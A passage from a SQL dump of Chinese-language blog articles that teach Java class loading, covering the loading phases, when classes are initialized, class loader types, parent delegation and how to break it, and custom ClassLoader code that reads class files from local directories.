符号引用验证调用了一个不存在方法,字段等等;符号引用验证的目的是确保解析动作能正常执行,如果无法通过符号引用验证,将会抛出一个java.lang.IncompatibleClassChangeError异常的子类,如java.lang.IllegalAccessError,java.lang.NoSuchFieldError,java.lang.NoSuchMethodError\n\n```\n#### 准备阶段\n```java\n// 准备阶段\n写好的那些类，其实都有一些类变量,比如下面的这个\"User\"类：\npublic class User {\n	public static int age;\n}\n\n假设有这么一个\"User\"类，\"User\"文件内容刚刚被加载到内存之后，会进行验证，确认这个字节码文件的内容是规范的。\n接着就会进行准备工作,这个准备工作，其实就是给这个\"User\"类分配一定的内存空间\n然后给他里面的类变量（也就是static修饰的变量）分配内存空间，来一个默认的初始值\n比如上面的示例里，就会给\"age\"这个类变量分配内容空间，给一个\"0\"这个初始值。\n\n// 准备阶段作用\n正式为类变量（static变量）分配内存并设置类变量初始值的阶段，这些内存都将在方法区中进行分配\n\n// 类变量类型的初始值\n// 数据类型		初始值\nint				 0\nlong				0L\nshort			  (short)0\nchar				\'\\u0000\'\nbyte			   (byte)0\nboolean		     false \nfloat				0.0f \ndouble 			  0.0d\nreference			null \n\n```\n\n#### 解析阶段\n```java\n// 解析阶段\n这个阶段实际上是把符号引用替换为直接引用的过程，其实这个部分的内容很复杂，涉及到JVM的底层\n\n// 解析阶段作用\n(1) 虚拟机常量池的符号引用替换为字节引用过程\n(2) 虚拟机规范之中并未规定解析阶段发生的具体时间,只要求在执行anewarray,checkcast,getfield,getstatic,instanceof,invokeinterface,invokespecial,invokestatic,invokevirtual,multianewarry,new,putfield和putstatic这13个用于操作符号引用的字节码指令之前,先对它们所使用的符号引用进行解析,所以虚拟机实现会根据需要来判断,到底是在类被加载器加载时就对常量池中的符号引用进行解析,还是等到一个符号引用将要被使用前才去解析它\n\n// 解析内容\n(1) 所谓解析就是把Class文件常量池中的符号引用转换为直接引用的过程,包括:符号引用:以一组无歧义的符号来描述所引用的目标,与虚拟机的实现无关\n(2) 直接引用: 直接指向目标的指针、相对偏移量、或是能简接定位到目标的句柄,是和虚拟机实现相关的\n(3) 主要针对: 类、接口、字段、类方法、接口方法、方法类型、方法句柄、调用点限定符\n\n// 具体解析种类\n(1) 类或者接口的解析\n(2) 字段解析\n(3) 类方法解析\n(4) 接口方法解析\n\n```\n#### 初始化阶段\n```java\n在准备阶段时，就会把\"User\"类给分配好内存空间,另外他的一个类变量\"age\"也会给一个默认的初始值\"0\"。\n那么接下来，在初始化阶段，就会正式执行类初始化的代码了。\n\n// 什么是类初始化的代码\n// 例子\npublic class User {\n    public static int age = Configuration.getInt(\"user.age.interval\");\n}\n\n对于\"age\"这个类变量，是打算通过Configuration.getInt(\"user.age.interval\")这段代码来获取一个值，并且赋值给它的。\n准备阶段时不会执行这个赋值逻辑的,在准备阶段，仅仅是给\"age\"类变量开辟一个内存空间，然后给个初始值“0”就完事了。\n这段赋值的代码实际上是在\"初始化\"阶段来执行。\n\n// 例子2\n另外比如下面的static静态代码块，也会在这个阶段来执行。\n类似下面的代码语义，可以理解为类初始化的时候，调用\"loadConfigsFromDish()\"方法从磁盘中加载用户的配置，并且放在静态变量\"configs\"中：\npublic class User {\n    public static Map configs;\n	static {\n		loadConfigsFromDish();\n	}\n	public static void loadConfigsFromDish() {\n		this.configs = new HashMap();\n	}\n}\n\n(1) 初始化阶段是执行类构造器（）方法的过程。类构造器（）方法是由编译器自动收藏类中的所有类变量的赋值动作和静态语句块(static块)中的语句合并产生，代码从上往下执行。 \n(2) 当初始化一个类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化\n(3) 虚拟机会保证一个类的<clinit\\>()方法在多线程环境中被正确加锁和同步\n\n// 什么时候会初始化一个类\n一般来说有以下一些时机：\n(1) \"new User()\"来实例化类的对象了，此时就会触发类的加载到初始化的全过程，把这个类准备好，然后再实例化一个对象出来；\n(2) 包含“main()”方法的主类，必须是立马初始化的。\n(3) 如果初始化一个类的时候，发现他的父类还没初始化，那么必须先初始化他的父类\n// 例子\npublic class User extends AbstractUser {}\n如果\"new User()\"初始化这个类的实例，那么会加载这个类，然后初始化这个类\n但是初始化这个类之前，发现 AbstractUser 作为父类还没加载和初始化，那么必须先加载这个父类，并且初始化这个父类。\n\n// 类的初始化作用\n类的初始化就是为类的静态变量赋初始值,或者说是执行类构造器<clint>方法的过程\n(1) 如果类还没有加载和连接,就先加载和连接\n(2) 如果类存在父类,且父类没有初始化,就先初始化父类\n(3) 如果类中存在初始化语句,就依次执行这些初始化语句\n(4) 如果是接口的话\n	a. 初始化一个类的时候,并不会先初始化它实现的接口\n	b. 初始化一个接口的时候,并不会初始化它的父接口\n	c. 只有当程序首次使用接口里面的变量或者调用接口方法的时候,才会导致接口初始化\n(5) 调用Classloader类的loadClass方法来装载一个类,并不会初始化这个类,不是对类的主动使用\n\n// 类的初始化时机\nJava程序对类的使用方式分成: 主动使用和被动使用,JVM必须在每个类或接口\"首次主动使用\"时才初始化它们;被动使用类不会导致类的初始化,主动使用情况\n(1) 创建类实例\n(2) 访问某个类或接口的静态变量\n(3) 调用类的静态方法\n(4) 反射某个类\n(5) 初始化某个类的子类,而父类还没有初始化\n(6) JVM启动的时候运行的主类\n(7) 定义了default方法的接口,当接口实现类初始化时\n\n// <clinit\\>()方法\n(1) 初始化阶段是类加载过程中的最后一步\n(2) 初始化阶段是执行构造函数<clinit\\>方法的过程\n(3) <clinit\\>()方法是由编译器自动收集类中的所有变量的赋值动作和静态语句块中的语句合并产生的\n(4) 静态语句块中只能访问到定义在静态语句块之前的变量,定义在他之后的变量,只能赋值,不能访问\n(5) <clinit\\>方法与类的构造函数有点区别,他不需要显示的调用父类的构造函数,虚拟机会保证在子类的<clinit\\>执行之前,先执行父类的<clinit\\>,因此在虚拟机中首先被执行的是Object<clinit\\>()方法\n(6) 由于父类的<clinit\\>方法要先执行,也就意味着父类中定义的静态语句块,要优先于子类\n(7) <clinit>方法对于一个类来说并不是必须的,因为没有静态代码块静态属性的话可能不是必须的\n(8) 接口中同样存在<clinit>()方法，但是不需要先执行父接口的<clinit>(),接口中也可以有静态的属性\n(9) 虚拟机有义务保证<clinit>()方法的线程安全,保证clinit过程中只有一个线程操作\n\n```\n#### 卸载阶段\n```java\n// 卸载阶段\n(1) 当代表一个类的Class对象不再被引用,那么Class对象的生命周期就结束了,对应的在方法区中的数据也会被卸载\n(2) JVM自带的类加载器装载的类,是不会卸载的,由用户自定义的类加载器的类是可以卸载的\n\n// 类的卸载和类加载器回收\nJVM中的Class只有满足以下三个条件,才能被GC回收,也就是该Class被卸载(unload)\n(2) 该类所有的实例都已经被GC\n(3) 加载该类的ClassLoader实例已经被GC\n(5) 该类的java.lang.Class对象没有在任何地方被引用\nGC的时机我们是不可控的,那么同样的我们对于Class的卸载也是不可控的\n\n```\n### 会初始化与不会初始化的情况\n#### 会初始化的情况\n```java\npublic class ClassActiveUse1 {\n    public static void main(String[] args) throws ClassNotFoundException {\n        // 第一种主动使用 初始化 new,直接使用\n        new Obj();\n\n        // 第二种主动使用 初始化 访问某个类或接口的静态变量,或者对该静态变量进行赋值操作\n        System.out.println(Obj.salary); // 对类的静态变量访问\n        System.out.println(I.a); // 对接口的静态变量访问\n        Obj.salary = 10000000; // 对类的静态变量进行赋值\n        // I.a = 12; // 无法对接口属性赋值,只能访问\n\n        // 第三种主动使用 初始化 调用静态方法\n        Obj.printSalary();\n\n        // 第四种主动使用 初始化 反射某个类\n        Class.forName(\"com.tuwq.stage1.Obj\");\n\n        // 第五种主动使用 初始化了一个该类的子类\n        System.out.println(Child.age); // Child被初始化前Obj先被初始化了\n    }\n\n    static {\n        // 第六种 启动类,启动main方法的类,就是ClassActiveUse类\n        System.out.println(\"启动类\"); // 启动类初始化\n    }\n}\n\nclass Obj {\n\n    public static long salary = 100000L;\n\n    static {\n        System.out.println(\"obj 被初始化\");\n    }\n\n    public static void printSalary() {\n        System.out.println(\"========Obj=printSalary=====\");\n    }\n}\n\nclass Child extends Obj {\n\n    public static int age = 32;\n\n    static {\n        System.out.println(\"Child被初始化\");\n    }\n}\n\ninterface I {\n    public static final int a = 10; // 默认public static final\n}\n```\n#### 不会初始化的情况\n```java\npublic class NoInit {\n    public static void main(String[] args) throws ClassNotFoundException {\n        // (1) 通过子类访问父类得静态变量,不会初始化导致子类的初始化\n        System.out.println(Child.salary); // 被动引用 子类访问父类静态变量 子类不会初始化 父类会初始化\n\n        // (2) 定义引用数组,不会初始化类\n        Obj[] array = new Obj[10]; // 数组引用不会初始化\n\n        // (3) final修饰的常量会在编译期间放到常量池中,不会初始化类\n        System.out.println(Obj.salary); // 不会初始化 引用常量\n        // 注意! final修饰的复杂类型,在编译期间无法计算得出,会初始化类\n        System.out.println(Obj.x); // 会初始化 常量值Random不是常量,需要运行期算出来\n    }\n}\nclass Obj {\n\n    public static long salary = 100000L;\n\n    public static final int x = new Random().nextInt(100);\n\n    static {\n        System.out.println(\"obj 被初始化\");\n    }\n\n    public static void printSalary() {\n        System.out.println(\"========Obj=printSalary=====\");\n    }\n}\n\nclass Child extends Obj {\n\n    public static int age = 32;\n\n    static {\n        System.out.println(\"Child被初始化\");\n    }\n}\n\ninterface I {\n    public static final int a = 10; // 默认public static final\n}\n```', 0, 0, 99, 0, 0, '2020-11-05 19:25:41', '2020-11-05 19:25:41', 0, 0);
INSERT INTO `article` VALUES (100, 1, '类加载器种类与双亲委派机制', '2019/10/1570545797_mmexport1570367948599.jpg', '### 类加载器的种类\n![类加载类加载器种类.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626441151_类加载-类加载器种类.png)\n```java\n// Java虚拟机有哪些类加载器\n(1) 启动类加载器(BootstrapClassLoader)\n(2) 扩展类加载器(ExtensionClassLoader),jdk9之后删除,用于加载lib下的扩展类,由于jdk9后的模块化及安全问题删除\n(3) 平台类加载器(PlatformClassLoader),jdk9之后新增,代替了扩展类加载器\n(4) 应用类加载器(AppClassLoader)\n(5) 自定义加载器\n\n// (1) 启动类加载器\n用于加载启动的基础模块类,比如: java.base、java.management、java.xml等等\n负责将<JAVA_HOME>/lib,或者-Xbootclasspath参数指定的路径中的,且是虚拟机识别的类库加载到内存中(按照名字识别,比如rt.jar,对于不能识别的文件不予装载)\n// (2) 扩展类加载器\n负责加载<JRE_HOME>/lib/ext,或者java.ext.dirs系统变量所指定路径中的所有类库\n// (3) 平台类加载器\n用于加载一些平台相关的模块,比如:java.scripting、java.compiler*、java.corba*等等,在jdk9及以后版本代替了扩展类加载器\n// (4) 应用程序类加载器\n用于加载应用级别的模块,比如: jdk.compiler、jdk.jartool、jdk.jshell等等;还加载classpath路径中的所有类库\n// (5) 自定义类加载器\n用户自定义的加载器,是java.lang.ClassLoader的子类,用户可以定制类的加载方式;只不过自定义类加载器其加载的顺序是在所有系统类加载器的最后\n\n// 各类加载器的详细说明\n(1) 启动类加载器: \n该加载器没有父加载器,它负责加载虚拟机的核心类库,如java.lang.*等;\njava.lang.Objectj就是由启动类加载器加载的,启动类加载器从系统属性sub.boot.class.path所指定的目录加载类库。\n启动类加载器的实现依赖于底层操作系统,属于虚拟机的实现的一部分。\n主要加载的是JVM自身需要的类，这个类加载使用C++语言实现的，是虚拟机自身的一部分，它负责将 /lib路径下的核心类库或-Xbootclasspath参数指定的路径下的jar包加载到内存中，\n注意必由于虚拟机是按照文件名识别加载jar包的，如rt.jar，如果文件名不被虚拟机识别，即使把jar包丢到lib目录下也是没有作用的(出于安全考虑，启动类加载器只加载包名为java、javax、sun等开头的类)。因为是C++编写,所以它并没有继承java.lang.ClassLoader类\n\n(2) 扩展类加载器: \n它的父加载器为启动类加载器,它从java.ext.dirs系统属性所指定的目录中加载类库,或者从JDK的安装目录的jre/lib/ext子目录(扩展目录)下加载类库,如果把用户创建的JAR文件放在这个目录下,也会自动由扩展类加载器加载.扩展类加载器是纯Java类。\n扩展类加载器是指Sun公司(已被Oracle收购)实现的sun.misc.Launcher$ExtClassLoader类，由Java语言实现的。\n是Launcher的静态内部类，它负责加载/lib/ext目录下或者由系统变量-Djava.ext.dir指定位路径中的类库，开发者可以直接使用标准扩展类加载器。\n它是java.lang.ClassLoader类的子类\n\n(3) 系统类加载器: 也称为应用类加载器\n它的父加载器为扩展类加载器.它从环境变量classpath或者系统属性java.class.path所指定的目录中加载类.它是用户自定义的类加载器的默认父加载器,系统类加载器是纯Java类;\n系统类加载器是指 Sun公司实现的sun.misc.Launcher$AppClassLoader。它负责加载系统类路径java -classpath或-D java.class.path 指定路径下的类库，也就是我们经常用到的classpath路径，开发者可以直接使用系统类加载器，一般情况下该类加载是程序中默认的类加载器，通过ClassLoader#getSystemClassLoader()方法可以获取到该类加载器,\n它是java.lang.ClassLoader类的子类\n\n// 各类加载器的关系\n(1) 启动(引导)类加载器: 由C++实现，没有父类。\n(2) 扩展(拓展)类加载器:  由Java语言实现，父类加载器为null\n(3) 系统(应用)类加载器: 由Java语言实现，父类加载器为ExtClassLoader\n(4) 自定义类加载器: 父类加载器为AppClassLoader\n(5) 加载器之间是包装(包含)关系而不是继承关系\npublic static void main(String[] args) throws ClassNotFoundException {\n        System.out.println(System.getProperty(\"sun.boot.class.path\"));\n        System.out.println(System.getProperty(\"java.ext.dirs\"));\n\n        Class<?> klass = Class.forName(\"com.tuwq.stage1.SimpleObject\");\n        System.out.println(klass.getClassLoader()); // sun.misc.Launcher$AppClassLoader\n        System.out.println(klass.getClassLoader().getParent()); // sun.misc.Launcher$ExtClassLoader\n        System.out.println(klass.getClassLoader().getParent().getParent()); // null 由于根加载器是c,c++编写,所以是null\n\n        Class<?> clazz = Class.forName(\"java.lang.String\");\n        System.out.println(clazz);\n        System.out.println(clazz.getClassLoader());// null 根加载器加载java.lang.String\n}\n\n// 注意事项\n(1) Java程序直接设置classLoader为null,默认就使用启动类加载器\n(2) 类加载器并不需要等到某个类 \"首次主动使用\" 的时候才加载它,jvm规范允许类加载器在预料到某个类将要被使用的时候就预先加载它\n(3) 如果在加载的时候.class文件缺失,会在该类首次主动使用报告LinkageError错误,如果一直没有被使用,就不会报错\n\n```\n### 双亲委派机制\n![类加载类加载器的双亲委派机制.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626442102_类加载-类加载器的双亲委派机制.png)\n```java\n// 什么是双亲委派机制\n(1) 如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归\n(2) 请求最终将到达顶层的启动类加载器，如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，向下传递,子加载器才会尝试自己去加载，这就是双亲委派模式\n\n// 双亲委派\nJVM中的ClassLoader通常采用双亲委派模型,要求除了启动类加载器外,其余的类加载器都应该有自己的父级加载器,这里的父子关系是组合而不是继承,工作过程如下\n(1) 一个类加载器接收到类加载请求后,首先搜索它的内建加载器定义的所有\"具名模块\"\n(jdk9之后会去搜索自己所有的具名模块,是否有符合的模块类;jdk8以下因没有模块化所以不执行此步骤)\n(2) jdk9版本之后如果找到了合适的模块定义,将会使用该加载器来加载,jdk8以及之前版本没有该步骤\n(3) 如果class没有在这些加载器定义的具名模块中找到,那么将会委托给父级加载器,直到启动类加载器\n(4) 如果父级加载器反馈它不能完成加载请求,比如在它的搜索路径下找不到这个类,那子的类加载器才自己来加载\n(5) 在类路径下找到类将成为这些加载器的无名模块(jdk9后会形成无名模块)\n\n// 双亲委派模式有什么好处\n(1) 避免重复加载: 采用双亲委派模式的是好处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次\n(2) 安全因素: java核心api中定义类型不会被随意替换，假设通过网络传递一个名为java.lang.Integer的类，通过双亲委托模式传递到启动类加载器，而启动类加载器在核心Java API发现这个名字的类，发现该类已被加载，并不会重新加载网络传递的过来的java.lang.Integer，而直接返回已加载过的Integer.class，这样便可以防止核心API库被随意篡改\n(3) 防止胡编乱造的类,如java.lang.ABC: 由于父类加载器路径下并没有该类，所以不会加载，将反向委托给子类加载器加载，最终会通过系统类加载器加载该类。但是这样做是不允许,java.lang是核心API包，需要访问权限，强制加载将会报出如下异常java.lang.SecurityException: Prohibited package name: java.lang\n\n// 双亲委派模型对于保证Java程序的稳定运作很重要\n(1) 公用且具有一致性,同样的类尤其是公有类都只会加载一次,如lang类的String,下级加载器都委托到启动加载器从而使用一致的String,从而避免使用不同的类导致的错误\n(2) 安全,对于已经加载的系统级的类,不管哪个加载器都不能再装载这些类的,不能拥有同包同名的类被加载,保护这些系统类不会被修改或覆盖\n\n// 实现双亲委派的loadClass()方法\n实现双亲委派的代码在java.lang.ClassLoader的loadClass()方法中,如果自定义类加载器的话,推荐覆盖实现findClass()方法\n\n// 注意事项\n(1) 如果有一个类加载器能加载某个类,称为定义类加载器,所有能成功返回该类的Class的类加载器都被称为初始类加载器\n(2) 如果没有指定父加载器,默认是最高级的启动类加载器\n(3) 每个类加载器都有自己的命名空间,命名空间由该加载器及其所有父加载器所加载的类构成,不同的命名空间,可以出现类的全路径名相同的情况,如启动两次程序,两个类加载器使用相同全路径类,却不能交互\n(4) 运行时包由同一个类加载器的类构成,决定两个类是否属于同一个运行时包,不仅要看全路径名是否一样,还要看定义类加载器是否相同,只有属于同一个运行时包的类才能实现相互包内可见\n\n// 同一个加载器或同一个父类加载器,Class是同一个\npublic static void main(String[] args) throws ClassNotFoundException {\n        MyClassLoader classLoader1 = new MyClassLoader(\"MyClassLoader1\");\n        MyClassLoader classLoader2 = new MyClassLoader(\"MyClassLoader2\", classLoader1);\n        classLoader2.setDir(\"E:\\\\databak\\\\classloader2\");\n\n        // 同一个加载器或同一个父类加载器,Class是同一个\n        Class<?> aClass = classLoader1.loadClass(\"com.tuwq.stage1.MyObject\");\n        System.out.println(aClass.hashCode());\n        Class<?> aClass2 = classLoader2.loadClass(\"com.tuwq.stage1.MyObject\");\n        System.out.println(aClass2.hashCode());\n        System.out.println(aClass.hashCode() == aClass2.hashCode()); // true\n        System.out.println(((MyClassLoader)aClass.getClassLoader()).getClassLoaderName()); // MyClassLoader1\n    }\n\n// 不同加载器加载不同Class,Class不是同一个\npublic static void main(String[] args) throws ClassNotFoundException {\n        MyClassLoader classLoader1 = new MyClassLoader(\"MyClassLoader1\");\n        MyClassLoader classLoader2 = new MyClassLoader(\"MyClassLoader2\");\n        classLoader2.setDir(\"E:\\\\databak\\\\classloader2\");\n\n        // 不同加载器,Class不是同一个\n        Class<?> aClass = classLoader1.loadClass(\"com.tuwq.stage1.MyObject\");\n        System.out.println(aClass.hashCode());\n        Class<?> aClass2 = classLoader2.loadClass(\"com.tuwq.stage1.MyObject\");\n        System.out.println(aClass2.hashCode());\n        System.out.println(aClass.hashCode() == aClass2.hashCode()); // false\n        System.out.println(((MyClassLoader)aClass.getClassLoader()).getClassLoaderName());\n    }\n\n```\n### 打破双亲委派机制\n```java\n双亲模型有个问题: \n父加载器无法向下识别子加载器加载的资源,因此适当会打破这个双亲委派的模型来实现一些需求\n为了解决这个问题,一般有两种方式\n(1) 自定义类加载器,重写loadClass方法来打破双亲委派模型\n(2) 通过Thread的setContextClassLoader()来设置要使用的类加载器\n\n```\n\n#### 重写loadClass方法打破双亲委派模型\n```java\npublic class SimpleClassLoader extends ClassLoader {\n\n    private final static String DEFAULT_DIR = \"E:\\\\databak\\\\revert\";\n\n    private String dir = DEFAULT_DIR;\n\n    private String classLoaderName;\n\n    public SimpleClassLoader() {\n        super();\n    }\n\n    public SimpleClassLoader(String classLoaderName) {\n        super();\n        this.classLoaderName = classLoaderName;\n    }\n\n    public SimpleClassLoader(String classLoaderName, ClassLoader parent) {\n        super(parent);\n        this.classLoaderName = classLoaderName;\n    }\n\n    @Override\n    protected Class<?> findClass(String name) throws ClassNotFoundException {\n        String classPath = name.replace(\".\", \"/\");\n        File classFile = new File(dir, classPath + \".class\");\n        if (!classFile.exists()) {\n            throw new ClassNotFoundException(\"The class \" + name + \" not found under \" + dir);\n        }\n        byte[] classBytes = loadClassBytes(classFile);\n        if (null == classBytes || classBytes.length == 0)\n            throw new ClassNotFoundException(\"load the class \" + name + \" failed\");\n\n        return this.defineClass(name, classBytes, 0, classBytes.length);\n    }\n\n    private byte[] loadClassBytes(File classFile) {\n        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();\n             FileInputStream fis = new FileInputStream(classFile)) {\n            byte[] buffer = new byte[1024];\n            int len;\n            while ((len = fis.read(buffer)) != -1) {\n                baos.write(buffer, 0, len);\n            }\n            baos.flush();\n            return baos.toByteArray();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    @Override\n    protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {\n        Class<?> clazz = null;\n	 	// java.lang.Object等以java包名开头的类需要父加载器进行加载\n        if (name.startsWith(\"java.\")) {\n            try {\n                ClassLoader system = ClassLoader.getSystemClassLoader();\n                clazz = system.loadClass(name);\n                if (clazz != null) {\n                    if (resolve) {\n                        resolveClass(clazz);\n                    }\n                    return clazz;\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        try {\n            clazz = findClass(name);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        if (clazz == null && getParent() != null) {\n            clazz = getParent().loadClass(name);\n        }\n        return clazz;\n    }\n\n    public String getDir() {\n        return dir;\n    }\n\n    public void setDir(String dir) {\n        this.dir = dir;\n    }\n\n    public String getClassLoaderName() {\n        return classLoaderName;\n    }\n}  \n\n// 测试\npublic static void main(String[] args) throws ClassNotFoundException {\n        SimpleClassLoader simpleClassLoader = new SimpleClassLoader();\n        // 打破双亲委托\n		// 不在ide中将该类删除,那么会去用AppClassLoader去加载\n		// 但由于重写了loadClass方法,非java包名开头的类不会委托父加载器\n        Class<?> aClass = simpleClassLoader.loadClass(\"com.tuwq.stage2.SimpleObject\");\n        System.out.println(aClass.getClassLoader());// com.tuwq.stage2.SimpleClassLoader \n}\n\n```\n#### java包名开头的类无法打破双亲委托模型\n```java\n@Override\nprotected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {\n       Class<?> clazz = null;\n       if (clazz == null && getParent() != null) {\n          clazz = getParent().loadClass(name);\n       }\n       return clazz;\n}\n\npublic static void main(String[] args) throws ClassNotFoundException {\n        SimpleClassLoader simpleClassLoader = new SimpleClassLoader();\n        // 尝试加载自己的java.lang.String\n        Class<?> aClass = simpleClassLoader.loadClass(\"java.lang.String\"); // 被限制了 Prohibited package name: java.lang\n		// 加载失败了,jdk对此做了安全防范\n		// 即使修改了委托机制,使用自定义加载器也无法重写java.lang等核心包的类\n        System.out.println(aClass.getClassLoader());// null\n}  \n```\n#### setContextClassLoader打破双亲委派模型\n```java\npublic static void main(String[] args){\n        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();\n        System.out.println(contextClassLoader);\n\n        Thread.currentThread().setContextClassLoader(new MyClassLoader());\n        System.out.println(Thread.currentThread().getContextClassLoader());\n}\n\n// setContextClassLoader(线程上下文类加载器)的作用\n(1) 将类加载器绑定到线程当中,在本线程的执行过程中取出\n(2) 由于双亲委托机制的原因,导致许多第三方实现类无法使用;因为加载第三方的jar包需要依靠系统应用加载器在classpath路径所进行加载的,但是由于JVM的核心rt.jar中包名都是以java.*开头,导致都被启动加载器所加载,而不会去用系统应用加载器去加载第三方编写的类库\n(3) 可以实现第三方直接实现类来接收和定义变量,但是这就违背了面向接口编程\n(4) 因为这样的原因,java的解决方案是在会使用启动类加载器的这些类中使用线程上下文的类加载器来加载一次这些实现类,并来和Class.forName()注册的实现类进行比较来保证面向接口编程\n\n```\n### 类加载器的命名空间\n![类加载类加载器的命名空间.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626443413_类加载-类加载器的命名空间.png)\n```java\n// 命名空间\n(1) 每个类加载器都有命名空间,命名空间由该加载器及其所有父加载器所加载的类组成,在同一个命名空间中,不会出现完整的名字\n(2) 父类加载器看不到子类加载器加载的类,不同命名空间下的类加载器之间的类互相不可访问\n\n// RuntimePackage.class这个启动main方法的类由应用类加载器加载的\npackage com.tuwq;\npublic class RuntimePackage {\n    // Boot.Ext.App.com.tuwq.User 这是应用类加载器的命名空间运行时包 这里看不到自定义加载器\n    // Boot.Ext.App.MyCustomClassLoader.com.tuwq.User 这是自定义加载器的命名空间运行时包\n    // 父加载器看不到子加载器加载的类 不同加载器之间也看不到相互的类,所以应用类看不到自定义类加载类的User\n    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException {\n        MyCustomClassLoader myCustomClassLoader = new MyCustomClassLoader();\n        Class<?> aClass = myCustomClassLoader.loadClass(\"com.tuwq.User\");\n        System.out.println(aClass);\n        System.out.println(aClass.getClassLoader()); // MyCustomClassLoader\n		// 这时用反射创建一个User,但是现在是在应用类加载器的RuntimePackage类中,应用类加载器是找不到User类的 所以报错了java.lang.ClassCastException\n        User user = (User) aClass.newInstance();\n    }\n}\n```', 0, 0, 94, 0, 0, '2020-11-07 22:43:32', '2020-12-25 22:43:32', 0, 0);
INSERT INTO `article` VALUES (101, 1, '自定义类加载器', '2019/10/1570610235_mmexport1570610135095.jpg', '### ClassLoader的核心方法\n```java\n// loadClass(String)\n1. 该方法加载指定名称（包括包名）的二进制类型,loadClass()方法是ClassLoader类自己实现的，该方法中的逻辑就是双亲委派模式的实现;\n2. loadClass(String name, boolean resolve)是一个重载方法，resolve参数代表是否生成class对象的同时进行解析相关操作。\n3. 当类加载请求到来时，先从缓存中查找该类对象，如果存在直接返回，如果不存在则交给该类加载去的父加载器去加载，倘若没有父加载则交给顶级启动类加载器去加载，最后倘若仍没有找到，则使用findClass()方法去加载\n4. 从loadClass实现也可以知道如果不想重新定义加载类的规则，也没有复杂的逻辑，只想在运行时加载自己指定的类，那么我们可以直接使用this.getClass().getClassLoder.loadClass(\"className\")，这样就可以直接调用ClassLoader的loadClass方法获取到class对象。\n\n// findClass(String)\n1. 在自定义类加载时，总会去继承ClassLoader类并重写loadClass方法，从而实现自定义的类加载类，但是在JDK1.2之后已不再建议用户去覆盖loadClass()方法，而是建议把自定义的类加载逻辑写在findClass()方法中\n2. 从前面的分析可知，findClass()方法是在loadClass()方法中被调用的，当loadClass()方法中父加载器加载失败后，则会调用自己的findClass()方法来完成类加载，这样就可以保证自定义的类加载器也符合双亲委托模式。\n3. 要注意的是ClassLoader类中并没有实现findClass()方法的具体代码逻辑，取而代之的是抛出ClassNotFoundException异常，同时应该知道的是findClass方法通常是和defineClass方法一起使用的\n\n// defineClass(byte[], int, int)\n1. defineClass()方法是用来将byte字节流解析成JVM能够识别的Class对象(ClassLoader中已实现该方法逻辑)\n2. 通过这个方法不仅能够通过class文件实例化class对象，也可以通过其他方式实例化class对象，如通过网络接收一个类的字节码，然后转换为byte字节流创建对应的Class对象\n3. defineClass()方法通常与findClass()方法一起使用，一般情况下，在自定义类加载器时，会直接覆盖ClassLoader的findClass()方法并编写加载规则，取得要加载类的字节码后转换成流，然后调用defineClass()方法生成类的Class对象\n\n// resolveClass(Class<?>)\n1. 使用该方法可以使用类的Class对象创建完成也同时被解析。\n2. 依据类加载的链接阶段主要是对字节码进行验证,为类变量分配内存并设置初始值同时将字节码文件中的符号引用转换为直接引用\n```\n### 自定义类加载器\n```java\npublic class MyClassLoader extends ClassLoader {\n	// 读取class文件的目录根路径\n    private final static String DEFAULT_DIR = \"E:\\\\databak\\\\classloader1\";\n\n    private String dir = DEFAULT_DIR;\n\n    private String classLoaderName;\n\n    public MyClassLoader() {\n        super();\n    }\n\n    public MyClassLoader(String classLoaderName) {\n        super();\n        this.classLoaderName = classLoaderName;\n    }\n\n    public MyClassLoader(String classLoaderName, ClassLoader parent) {\n        super(parent);\n        this.classLoaderName = classLoaderName;\n    }\n\n    /**\n     * 读取class文件并加载Class\n     * @param name\n     * @return\n     * @throws ClassNotFoundException\n     */\n    @Override\n    protected Class<?> findClass(String name) throws ClassNotFoundException {\n        String classPath = name.replace(\".\", \"/\");\n        File classFile = new File(dir, classPath + \".class\");\n        if (!classFile.exists()) {\n            throw new ClassNotFoundException(\"The class \" + name + \" not found under \" + dir);\n        }\n        byte[] classBytes = loadClassBytes(classFile);\n        if (null == classBytes || classBytes.length == 0)\n            throw new ClassNotFoundException(\"load the class \" + name + \" failed\");\n\n        return this.defineClass(name, classBytes, 0, classBytes.length);\n    }\n\n    /**\n     * 读取class文件转换为字节数组\n     * @param classFile\n     * @return\n     */\n    private byte[] loadClassBytes(File classFile) {\n        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();\n             FileInputStream fis = new FileInputStream(classFile)) {\n            byte[] buffer = new byte[1024];\n            int len;\n            while ((len = fis.read(buffer)) != -1) {\n                baos.write(buffer, 0, len);\n            }\n            baos.flush();\n            return baos.toByteArray();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public String getDir() {\n        return dir;\n    }\n\n    public void setDir(String dir) {\n        this.dir = dir;\n    }\n\n    public String getClassLoaderName() {\n        return classLoaderName;\n    }\n}\n```\n#### 测试\n```java\npublic static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {\n        MyClassLoader classLoader = new MyClassLoader(\"MyClassLoader\");\n		// 运行此main方法前,先在ide中将该类删除\n		// 否则会因为双亲委托机制导致使用应用类加载器加载的MyObject,而不是自定义加载器所加载的class文件位置\n        Class<?> aClass = classLoader.loadClass(\"com.tuwq.stage1.MyObject\");\n        System.out.println(aClass); // class com.tuwq.stage1.MyObject\n        System.out.println(aClass.getClassLoader());// com.tuwq.stage1.MyClassLoader\n\n        Object obj = aClass.newInstance();\n        Method method = aClass.getMethod(\"hello\", new 